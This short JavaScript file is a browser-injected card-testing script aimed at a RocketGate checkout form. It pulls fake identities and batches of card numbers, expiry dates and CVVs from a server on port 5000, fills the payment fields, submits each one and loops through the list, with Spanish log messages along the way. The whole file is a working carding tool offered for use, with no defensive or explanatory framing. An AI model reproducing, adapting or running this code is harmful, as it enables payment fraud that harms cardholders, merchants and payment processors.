var postUrl = "http://" + baseUrl + ":5000/post";
var fakeUrl = "http://" + baseUrl + ":5000/fake?city=Miami&callback=fake";
var iteration = null;
var options = {
     url:fakeUrl,
     dataType: "jsonp"
};
var cards = function(arr) {
	var i = 0;
	var percentage = 30;
	var len = Math.ceil(arr.length * (percentage / 100));

	iteration = function() {
	  if( i < len ) {
	    var json = arr[i++];
	    sessionStorage.card = JSON.stringify( json );

	    $("input[name=RocketGate_ccno]").val(json.card);
	    $("select[name=RocketGate_ccexpm]").val(json.mon);
        $("select[name=RocketGate_ccexpy]").val(json.year);
	    $("input[name=RocketGate_cccode]").val(json.cvv);
	    $("#checkout-btn").click();

	    setTimeout(function(){
	    	var interval = setInterval(function() {
		        console.log("Procesando...")
		        console.log(window.location);
		        if ( !$(".overlayContainer").length ) {
		        	console.log("Probemos la proxima");
		        	clearInterval(interval);
		        	iteration();
		    	}
		    }, 1000);
	    }, 3000);

	  }
	  else {
	    $.ajax(options)
	    .success(cards);
	  }

	}

	iteration();
};
var fake = function( person ) {
	console.log( person.fullname );
	console.log( person.zip );

	$("input[name=RocketGate_firstname]").val( person.firstname );
	$("input[name=RocketGate_lastname]").val( person.lastname );
	$("input[name=RocketGate_zipcode]").val( person.zip );

	$("label[for=RocketGate_firstname]").addClass("active");
	$("label[for=RocketGate_lastname]").addClass("active");
	$("label[for=RocketGate_zipcode]").addClass("active");

	$("label[for=RocketGate_ccno]").addClass("active");
	$("label[for=RocketGate_cccode]").addClass("active");

	options.url = postUrl;
	$.ajax(options)
	.success(cards);;
}
// V2
$.ajax(options)
.success(fake);